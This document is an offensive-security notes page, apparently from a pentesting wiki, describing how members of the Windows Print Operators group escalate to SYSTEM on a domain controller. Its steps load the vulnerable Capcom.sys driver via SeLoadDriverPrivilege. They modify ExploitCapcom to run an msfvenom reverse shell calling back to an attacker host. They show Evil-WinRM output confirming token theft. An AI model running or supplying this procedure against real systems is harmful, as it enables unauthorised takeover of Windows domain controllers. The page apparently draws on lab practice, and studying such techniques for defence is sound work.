---
description: Manage, create, share, and delete printers.
---

# Print Operators

Print Operators a highly privileged group whos members can manage, create, share and delete printers connected to the DC. If `SeLoadDriverPrivilege` is not visible from an unelevated context, we will need to bypass UAC.

```
*Evil-WinRM* PS C:\Users\svc-print\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeLoadDriverPrivilege         Load and unload device drivers Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

### <mark style="color:yellow;">Loading a vulnerable driver</mark>

As member of print operator with the privilege SeLoadDriverPrivilege we can load drivers and exploit it by loading a vulnerable driver. We can use CapCom driver for this.\
[https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)

In Visual Studio create a new project eopdriver. Then past the code from [https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp](https://raw.githubusercontent.com/TarlogicSecurity/EoPLoadDriver/master/eoploaddriver.cpp)

From the includes remove `include "stdafx.h"`

Then build the project as Release and x64. Copy the compiled eodriver.exe and Capcom.sy to C:\programdata\\.

```powershell
*Evil-WinRM* PS C:\programdata> .\eopdriver.exe System\CurrentControlSet\Capcom C:\ProgramData\Capcom.sys
[+] Enabling SeLoadDriverPrivilege
[+] SeLoadDriverPrivilege Enabled
[+] Loading Driver: \Registry\User\S-1-5-21-2633719317-1471316042-3957863514-1104\System\CurrentControlSet\Capcom
NTSTATUS: 00000000, WinError: 0
```

### <mark style="color:yellow;">Exploit the driver</mark>

Having access to a gui we can just run ExploitCapCom as it will call cmd.exe. However without a gui thats not usefull. Therefore change the ExploitCapCom and point it to C:\ProgramData\reverse.exe which is a msfvenom made reverse shell.

1. Download ExploitCapcom and edit ExploitCapcom.cpp\
   [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

2. Change the line: `TCHAR CommandLine[] = TEXT("C:\ProgramData\reverse.exe");`.
3. Create a reverse shell `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.153 LPORT=443 -f exe -o reverse.exe`
4. Upload reverse.exe and the compiled ExploitCapcom.exe and run ExploitCapcom.exe for a reverse shell.

```powershell
*Evil-WinRM* PS C:\programdata> .\ExploitCapcom.exe
[*] Capcom.sys exploit
[*] Capcom.sys handle was obtained as 0000000000000080
[*] Shellcode was placed at 0000026FBA220008
[+] Shellcode was executed
[+] Token stealing was successful
[+] The SYSTEM shell was launched
[*] Press any key to exit this program
```
